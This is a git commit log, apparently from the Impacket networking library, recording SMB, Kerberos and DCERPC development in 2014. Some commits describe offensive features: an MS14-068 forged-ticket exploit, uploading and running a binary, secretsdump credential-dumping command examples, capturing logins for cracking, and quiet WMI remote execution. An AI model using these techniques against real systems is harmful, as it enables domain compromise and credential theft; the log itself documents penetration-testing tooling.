    Support for RPC_C_AUTHN_LEVEL_PKT_PRIVACY for Kerberos. RC4 only so far

commit 17323a5f8d344a7abc96d28292b480bb1025b2cb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 22 21:01:34 2014 +0000

    Kerberos support for samrdump

commit ed1eaed9825a370df9c2d1c445f5949ff91c7cbf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 22 20:54:59 2014 +0000

    Adding RPC_C_AUTHN_GSS_NEGOTIATE support for DCERPC. Not yet functional, although I can now bind using Kerberos as SSP. Still needing to work on the authenticators for signing/sealing.

commit d3d623ffe70c3dc025820850863400fc3e41ec73
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 19 16:54:14 2014 +0000

    All domains in uppercase.. just in case

commit fd638816dff817d16bd567913bda46f28ce0eefe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 19 16:31:51 2014 +0000

    Adding -w ability to save the goldenPac y CCache format

commit 82fed57e303166408ad8613a7806ec170c57d784
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 19 16:30:58 2014 +0000

    Adjusting to new getKerberosTGT, getKerberosTGS output

commit db0c491213179798f309a619564083e8bdafc34a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 19 16:28:57 2014 +0000

    1) Better parsing of ETYPE_INFO and ETYPE2_INFO
    2) Better handling of etypes
    3) Support for writing CCache files

commit dd7516b9e36e754d7e8b6fa3def1134da69dc1bd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 20:06:15 2014 +0000

    opening the file with 'rb' for our Windows friends

commit 4386b864ba3845d1302c92f2454c8fbdba15694d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 17:44:13 2014 +0000

    Improved getMachineNameAndDomain() in case we can't get the data the normal way. Now it will try RPC against wkst. This is needed when authenticating using Kerberos.

commit 11a3ac8df300d13b4989b73e085641e447ef0fd1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 17:20:01 2014 +0000

    Disabling AES256/128 until I figure a bug out

commit 0e7f2bc32ad8528fb62b01c03b864aad2da6e7cb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 16:12:40 2014 +0000

    An example added for the -c flag

commit 4b54788c2b4c97aa59bcad8eeb6bf1936196d5fe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 16:09:06 2014 +0000

    1) kerberosLogin will never use cached tickets (useCache = False)
    2) Added -c flag, uploads a binary and executes it

commit 8d4fe046ebdd35fe038cc0d9c49863978ed3a924
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 15 21:33:33 2014 +0000

    My first take on Kerberos support for secretsdump.py.. Two ways to use it
    1) Have cached tickets in your ccache file (pointed by KRB5CCNAME). E.g.
        kinit beto@FREEFLY.NET (my password will be asked)
        klist -v
        secretsdump.py -k FREEFLY.NET/beto@FREEFLY-DC
    
    2) Use the specified command line credentials. e.g.
        secretsdump.py -k FREEFLY.NET/beto:myPassword@FREEFLY-DC

commit fe290c618005344a785f3b16c98ee507e9c5fa10
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 15 19:21:27 2014 +0000

    Printing out the domain+rid = userSid.. might be useful for some ppl

commit 0a84907c4562fcf2455ae0959bbb042256a11b2f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 15 16:44:10 2014 +0000

    Support for AES128 and AES256. If hashes are specified, RC4 will be choosen.

commit ed4e2c35d952bd526edec00e9f309c2f64b0e275
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 15 16:42:03 2014 +0000

    1) Now Kerberos should work with AES128 and AES256 as well.
    2) If there's a cache, it will look for valid credentials and use them if possible

commit 2c2ac326db71c9c118a2f6a2ba905e6b7439e03c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 15 15:14:51 2014 +0000

    Making it more general, not tied to RC4

commit 8cd229d7e6623004f76aa3c462062ac74026481c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 15 13:13:54 2014 +0000

    CCache initial implmententation.
    The idea is to be able to use the cached tickets to automatically log in. Still not activated.

commit 285aa21c4547c8cfad147c630828f3ccb80e9f39
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 12 14:12:38 2014 +0000

    Missing import (thanks juan!)

commit f37d3dc9613589a2274b1e5baec563ce0fc96284
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 12 00:48:26 2014 +0000

    Minor change, we don't really need to set the amount of groups staticaly :P

commit 3b7bce75e004346c0e7d5fcd7daa82a9fb2486af
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 12 00:44:34 2014 +0000

    More documentation for getGoldenPAC(), adjusted some values based on [MS-PAC] description.

commit c858ba572eb1b0fb7bd43b1ec7aa304a676efcfc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 19:31:27 2014 +0000

    Minor changes to the hashes code

commit 75dffd7619cd890faccd3178c13d4546a2a1e154
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 19:24:10 2014 +0000

    Hashes support for Kerberos (will only work when cipher == RC4)

commit 6d76dea61b8f634f1d80a412adbac784f01a90de
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 19:15:32 2014 +0000

    Hashes support added. This only works with RC4

commit 519060a53cbca0151f31651b14b339d7de07404b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 14:59:45 2014 +0000

    KERB_ERROR_DATA data type added

commit 4a4d053e0687eb696dd5cd432efb8c502cf700de
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 14:58:43 2014 +0000

    Requirement's update

commit d3cf806ca088a1719c6ee633e8e84e2d1d5daa00
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 14:51:20 2014 +0000

    Added commented lines for MD4 and CRC32 unkeyed checksums if somebody wants to use something different than RSA_MD5

commit fa55414498e00d8d607a3deeba16098cb4eab4ff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 13:28:47 2014 +0000

    If we receive a KRB_ERR_GENERIC error we try to extract the NT_ERROR from it.. might fail sometimes..

commit 8ddd84d0507fb2c53f6ba8d5cf5d9fdb7d588f1f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 19:31:58 2014 +0000

    Added smbconnection.getServerDNSDomainName()

commit 6a89785203bfc7af9f064592681514fae65af057
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 16:17:12 2014 +0000

    lcd fix in case os.chdir() fails, improvements to the TGS request

commit 43376416668bdcc6aaca8b31cdf691c2d4a25a04
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 14:41:52 2014 +0000

    PUT and GET weren't working. Hopefully now that's fixed. I wasn't starting the transferClient connection with the forged TGS ticket, and were using the normal user's credentials, hence getting an ACCESS_DENIED.

commit 0719d451b65c31903f878c15132910d649877ee9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 13:17:50 2014 +0000

    1) epm.hept_map doesn't work well against w2k03, so we're sticking to the ncacn_np stringBinding
    2) Minor cosmetic things

commit 5e9d7b0031e341a2df578ebd49e32d646fb93252
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 9 16:05:52 2014 +0000

    1) Added Kerberos support for SMB1
    2) When asking for a TGS for cifs service, domain is not needed, could potentially bring problems if the target includes the domain FQDN

commit d869a24fc49a0116cbc16de4d3d57638c4d935bb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 7 11:26:54 2014 +0000

    Fixes https://code.google.com/p/impacket/source/detail?r=1278

commit 23505695b153da6a683d81c86185383c3cbee798
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 7 11:25:32 2014 +0000

    Cannot execute as a script w/o this! ;)

commit d914b02710d0d3e6d5dbc57ef7fd4f066ebd4044
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 6 13:10:42 2014 +0000

    My take on MS14-068. Credit goes to @BiDOrD since he's got a PoC out first. Well done!

commit e9b4176f9c58e4617a70589861b97ea7e3e69350
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 6 06:05:11 2014 +0000

    1) kerberosLogin: now you can specify a TGT/TGS if you have one
    2) fix a bug in smb3 when calculating the signing key

commit 94bcf46ebebb100f06cd5c4831b05dde56ee37ea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 6 02:12:35 2014 +0000

    typo in AuthorizationData()

commit 166c7b0d364cae10e67816e78db9e6962eca5655
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 5 16:32:59 2014 +0000

    Removing debug dumps.

commit feb172ebc9bbd0da69870e9abf4062a840ec0215
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 5 12:45:37 2014 +0000

    Initial support for Kerberos (see previous commits for the libraries).
    From smb_client use:
    kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
    
    It supports RC4 as of right now.

commit 7ed183aa48ced1e58581ece82cebcea12935ac6f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 5 12:43:45 2014 +0000

    1) Added kerberosLogin() to SMBConnection. Only SMB3 dialect supported so far
    2) Simplified Kerberos structs using dicts

commit 02ef6075f7c37da7239646f5dc63b65671854569
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 4 23:58:30 2014 +0000

    recv() doesn't always return the requested bytes :p

commit fe609d9444982d74e4b53d848962dd8729db2f60
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 4 21:35:43 2014 +0000

    Reverting previous accidental change to this file

commit b0fa3071d340083d291c33838e672d741c6495c0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 4 21:33:38 2014 +0000

    1) First attempt to support kerberos. Right now it's kerberosLogin(). Might be different in the future. Alpha code
    2) Start signing at the second packet sent (this is important for Kerberos signing)

commit 80faca5f6ea8ac62fffae6626abc47b3b4beb7a1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 4 21:31:44 2014 +0000

    Initial Kerberos implementation!
    asn1.py, types.py from https://github.com/mhorowitz/pykrb5 with some modifications
    crypto.py from XX
    Licenses should be OK

commit a023d3ffc6d879b2412c4ef485df7799194c2ddc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 27 13:43:31 2014 +0000

    Since share names can be UNC or just the name of the share, we should check them accordingly.

commit 8903e1211bbdf7424f902d588cf348832e9455b7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 24 13:53:18 2014 +0000

    adding a connectTree test case, with abs path and UNC path

commit 37af2379981a56d663010c2c96754566a0a61054
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 21 21:51:48 2014 +0000

    These fixes should allow using smbfs from Ubuntu to mount a share exported by the smbserver, e.g.:
    mount -t cifs //192.168.1.1/sharename /mnt
    
    1) Fix in the extended authentication mechanism, when a GSSAPI token is not received, and just a straight NTLMSSP structure.
    2) The smb.SMB_FIND_FILE_DIRECTORY_INFO structure wasn't completed when asking for a FindFirst2 with that level
    3) When calling NTCreateAndX, we weren't paying attention to GENERIC_READ and GENERIC_WRITE attributes

commit e9fb70adf5fc83470223d9fbf862b7667f940b6c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 17 18:31:29 2014 +0000

    switching to unicode before processing the actual command. This is needed in case directories/files are unicode encoded. Thanks renaud for the fix. This is part of the bigger https://code.google.com/p/impacket/issues/detail?id=51 issue

commit d746e86b8d51c74acbd851768fbcc03eeb49aff7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 15 23:09:31 2014 +0000

    Only parse the version field if we have some data. Just connected to a samba server and it is supporting SMB3, so this is not only Windows anymore. We should check in the future if Samba servers are returning something in the version field.

commit 2456145b8b7244ec7bc6231ca1c9414634ac7706
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 8 19:17:02 2014 +0000

    Clarifying one message..

commit 0ee8a7043414a015a2d9dbdc58c1729d1d6df6d5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 8 16:05:23 2014 +0000

    Fix trying to work correctly in the scenarios where NTDS.dit is not located in the default location.
    Thanks to mubix for pointing out the registry key to read for NTDS.dit location

commit df4d41c7fb5b56a0cb52408d2cee0534c197dc03
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 30 20:20:31 2014 +0000

    Fix for https://code.google.com/p/impacket/issues/detail?id=47 reported by carlruth

commit 9d9e3d73b23c688e411707898b695cf1c4370094
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 29 17:45:40 2014 +0000

    Fixes https://code.google.com/p/impacket/issues/detail?id=49 reported by mykesh

commit 2021a4072141aa4d1a2eb36003aa4c097e4b5d85
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 26 17:35:02 2014 +0000

    Fixes https://code.google.com/p/impacket/issues/detail?id=48 reported by Renaud

commit cc78dffc12384b7c13fa3bc921ac5e0f4e267acb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 26 17:33:53 2014 +0000

    Fixes https://code.google.com/p/impacket/issues/detail?id=48 reported by Renaud

commit aaf5ec1c266e5b444d15fec1fa363898af0de570
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 13 18:45:42 2014 +0000

    Typo when parsing the SMB2_SESSION_SETUP data.. It should be packet variable instead of ans!

commit 8115cff6e3d82bdda79e0b16b3e5b02bf5f6ed5c
Author: 6e726d@gmail.com <6e726d@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 3 00:15:29 2014 +0000

    Fixed minor bug when using -hashes parameter.

commit 2b6de58c7e7aac7858b33a0aba6b214963c5ccc1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 31 15:38:19 2014 +0000

    Temp fix for https://code.google.com/p/impacket/issues/detail?id=46 until we figure a better way to solve it.
    We're setting the Max*Size to min(0x100000, value-sent-from-server), which we know it works (Win7/8 sets it to 0x100000).
    In theory win8.1/2012R2 sets it to 0x800000 and for some reason the connection gets closed. However, my tests serves doesn't set the Max*Size to such big number, although a user reported it. More research needed.

commit a7672e4580c66242376045cbe2468b54be01a869
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 26 22:09:44 2014 +0000

     - Added file that contains pcap linktypes.

commit dc80285984cff34a988a34815902c0d256507f2c
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 26 20:30:07 2014 +0000

     - Moved pcap MAGIC outside the pcap header structure.

commit e672dc07950165b7a0f21198ae0415c6b32bcf9e
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 26 20:27:58 2014 +0000

     - Added frequency channel dictionary.

commit 6f94d4e43ebb697efb690bcc6684d50f6b010b11
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 17 16:21:37 2014 +0000

    Moving up to the next dev version

commit 5628648353a977a96c9f06b9dd2f39fc1512a3a6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 17 16:01:46 2014 +0000

    version change

commit b72c5eeea0b52fe1d9492c6ec2de4fcc4911f093
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 17 15:29:23 2014 +0000

    new version

commit 7075ae880609afb4598276dfbb86d358c60775ce
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 17 15:03:34 2014 +0000

    New features added

commit 893542cbce582b0c26ebdfd41a7e0db0849877d9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 26 13:54:47 2014 +0000

    Updating reference to testcases

commit 7d774b59a092340874ccfcbdebf19f62201625f5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 25 21:00:28 2014 +0000

    Bye bye

commit 82f4a4d4df76c5d0db6eecf8335acff5dff9e4e8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 25 20:58:48 2014 +0000

    You shouldn't be here

commit 669509ec11d07585f1ae2758f2128b14cc8fd1b5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 25 20:55:38 2014 +0000

    1) Moving SMB-RPC to SMB_RPC
    2) Changing inside dot11, test- for test_

commit e07ed49851310c75e3849a077e99b8a3d1656bfd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 23 18:14:15 2014 +0000

    Added command line arguments to set up a share. Now it should be really easy to launch an SMB server :)

commit 9065577d6b2cda0acb1a43441a87ca4c2a4dd68a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 11 15:36:00 2014 +0000

    1) smb.py: added SMB_COM_FLUSH structure
    2) smbserver.py: added SMB_COM_FLUSH command (not active yet)
    3) smbserver.py: added outputJohn call, everytime someone logs in, we output in John format the challenge/response, for further cracking

commit 9d74b68931e5cedb89dd2e9d0a3cbf2fc2d0205c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 19:46:08 2014 +0000

    No need to restrict the max packet size in Windows anymore :)

commit 1246c46784c92597bc89eaf01873fd677b0414a3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 19:33:13 2014 +0000

    infoRecord['EndOfFile'] can be zero, we gotta check that

commit 5b8d2dc2682c770514e27fe4b1e2ad3c1bdecc58
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 18:59:47 2014 +0000

    Adding config option to turn CAP_RPC_REMOTE_APIS on when negotiating the server's capabilities

commit e8453eb12d2ff450c67cb1c47f8a3086031a009e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 18:27:39 2014 +0000

    This changeset adds a minimalistic DCERPC server that is used by the smbserver.
    Why? With modern OSes connecting to the SMB server, you need to have a DCERPC server to serve MS-SRVS and MS-WKST (this last one for OSX clients, not yet implemented), otherwise they will NOT continue the connection.
    1) smbserver.py: added the SRVSServer class, that answers for NetrShareEnum(), NetrShareGetInfo() and NetrServerGetInfo() requests
    2) rpcrt.py: defines the basic DCERPCServer class, as the base class to be used for interfaces

commit b36eee904d2de9cbcdbb8e677101abd51b883460
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 18:09:57 2014 +0000

    Fixed hNetrServerGetInfo() when setting the now non existent InfoStruct field. Test cases updated as well

commit 67e3a13cfbf4824c4135b7df8dcd6fdf5489e0e7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 17:32:53 2014 +0000

    fixed NetrServerGetInfo() structure.

commit abb9d9bb05cf79cc3e3a019a0d11b60f83a2ff0a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 14:00:56 2014 +0000

    1) Docstrings added to SimpleSMBServer()
    2) Trans2/SMB_SET_FILE_END_OF_FILE_INFO now actually works, lseeking to the proposed allocated size
    3) I'm commenting  os.O_APPEND when opening a file, I think it is not needed and prevents 2) from working. Testing is needed

commit 48412a928c269325d0e473d23c9702f75aba2c38
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 9 17:07:34 2014 +0000

    Setting 127.0.0.1 as the address to bind and connect to the MS-SRVS server

commit a3ba4bbff2565734f0697d83546fcc41d32e5aa4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 9 16:51:07 2014 +0000

    1) Removed the smbserver directory
    2) Now a single smbserver.py example, that contains everything needed to run a simple SMB server and share files

commit a41382de3b12dbe1d0d4044db673716596021ffb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 9 16:49:43 2014 +0000

    1) smb.py: added CAP_RPC_REMOTE_APIS
    2) smbserver.py: Added SimpleSMBServer().. An easy way to launch a SMB Server and configure shares.
    3) smbserver.py: MaxMpxCount is set to 1 now, we don't want to deal with multiple connections from the same target.
    4) srvsvcserver.py: Now works with logger, some methods for processing config files refactored.
    5) srvsvcserver.py: Secondary address now points to \PIPE\srvsvc, this is needed to OSX clients.

commit 943286fa287203498dda1cab5da37aea52b49eec
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 5 22:28:55 2014 +0000

    Fix for https://code.google.com/p/impacket/issues/detail?id=44.
    SMB.retr_file() calls SMB.nt_create_andx() that was trying to open the file RW, which would trigger a problem when trying to read a file from a readonly share.
    I changed SMB.nt_create_andx() so it will accept an accessMask parameter (by default the same it was before, to minimize spash damage). SMB.retr_file() now calls nt_create_andx() with READ ONLY accessMask.

commit 99a3592eebc3a4e9827041ae4ec6891bb8fd4285
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 4 18:11:36 2014 +0000

    Stripping useless fstat() calls.

commit 92f1388318293ff2dfe4e2b3a6c46be932cf4f1c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 2 17:13:48 2014 +0000

    1) Added warning message when trying to CD to a directory
    2) StdErr is now also being included in the answer

commit f60357d512fda3b8f07da966be637cd69e357c76
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri May 23 18:51:05 2014 +0000

    Solving the same problem described at https://code.google.com/p/impacket/source/detail?r=1145&path=/trunk/examples/secretsdump.py, this time for esentutl.py

commit a0b82a054c53bdc3b54bb39461ea0d77a1b8800c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 19 14:57:30 2014 +0000

    Sync with Core's internal repository. Several fixes on nmb.py. This file should actually be rewritten, it's still using the old pysmb approach.

commit 77df3c13439869ede5b92bc9d035696634efb957
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 14 20:11:52 2014 +0000

    dcomrt: added set_objRef()
    wmi.py: added IWbemClassObject.SpawnInstance() and IWbemClassObject.marshalMe() (the method's naming convention is intentional :) ). PutInstance() and DeleteInstance() seems to be working well

commit 3a397dcdfef1dbbeab1c8de6abe69f1563cacf36
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 12 19:59:38 2014 +0000

    Fixed bug triggered when maxRid was a multiple of SIMULTANEOUS (thanks mubix!)

commit 3c79905a1ad4b24809791219a8a7fb4667b3cf27
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 11 22:59:12 2014 +0000

    type of default share parameter (should be ADMIN$ instead of C$)

commit ce015b25f3e14a6f5062438d57bae9ca56085838
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 7 19:03:42 2014 +0000

    Waiting for the thread to finish.

commit 2e9e0f3988e1bd934b259f3c036f5e93feb3a9c6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 4 22:49:02 2014 +0000

    1) Changes in the .py initial comments
    2) comev.py: Added specific IID used to self the request to
    3) dcomrt: Now we parse and store the minimum auth level required for the interface, used later when binding against it

commit b59b696c5c641b04309a607901c4d21d264b6908
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 17 15:20:44 2014 +0000

    Added -nooutput switch. You won't get the output of the command, but at the same time it doesn't open a connection against 445 for reading it (plus doesn't write any files at the target). Only works when specifying the command to execute through command line

commit 6214791a1257ebbef100ac665be7ce8099047be4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 16 20:33:05 2014 +0000

    Fixed https://code.google.com/p/impacket/issues/detail?id=42 reported by mubix.
    This is not the best solution so far, but until I figured out where OrderedDict is installed on different Python flavors i'm using this approach.
    I'm also applying the same fix for the ESE database parser that also uses OrderedDict. (used by secretsdump.py and esentutl.py)

commit b731389fe61b77f67ad7ee05ac3dbb769b256ec7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 16 18:35:19 2014 +0000

    Removing traceback and exception messages

commit c4421dac880966683df5fa4ad67b8325f5d0a50b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 16 17:59:24 2014 +0000

    Adding propset ID

commit 1cfe0970213c06e576fb70385b24d3be01a93c23
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 16 17:57:44 2014 +0000

    Reverting previous changeset

commit 78845a0c2d0b4ef3a5d6667df26737872ecc5fae
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 16 17:48:38 2014 +0000

    Adding propset Id

commit ace7aa33ae2bef083371071ac1ab0a283e488fa6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 16 17:46:10 2014 +0000

     A similar approach to smbexec but executing commands through WMI.
     Main advantage here is it runs under the user (has to be Admin)
     account, not SYSTEM, plus, it doesn't generate noisy messages
     in the event log that smbexec.py does when creating a service.
